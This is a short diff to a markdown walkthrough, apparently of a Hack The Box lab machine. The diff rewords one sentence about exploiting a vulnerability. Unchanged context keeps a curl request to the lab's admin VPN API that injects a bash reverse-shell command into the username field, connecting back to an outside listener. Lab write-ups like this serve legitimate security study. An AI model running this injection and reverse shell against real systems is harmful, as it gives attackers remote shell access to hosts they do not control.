@@ -171,7 +171,7 @@ It seems that after spending some time searching, I have discovered a vulnerabil
   <img src="pic/pic9.png" alt="Alt Text">
 </a>
 
-Now that we have identified the Remote Code Execution (RCE) vulnerability, we can exploit it 
+Now that we have identified vulnerability, we can exploit it 
 
 ```bash
 curl -X POST http://2million.htb/api/v1/admin/vpn/generate -H "Cookie: PHPSESSID=b99sapscujo3dg9l7c454tt4fm" -H "Content-Type: application/json" -d '{"username":"$(bash -c 'bash -i >& /dev/tcp/10.10.10.10/9001 0>&1')"}'
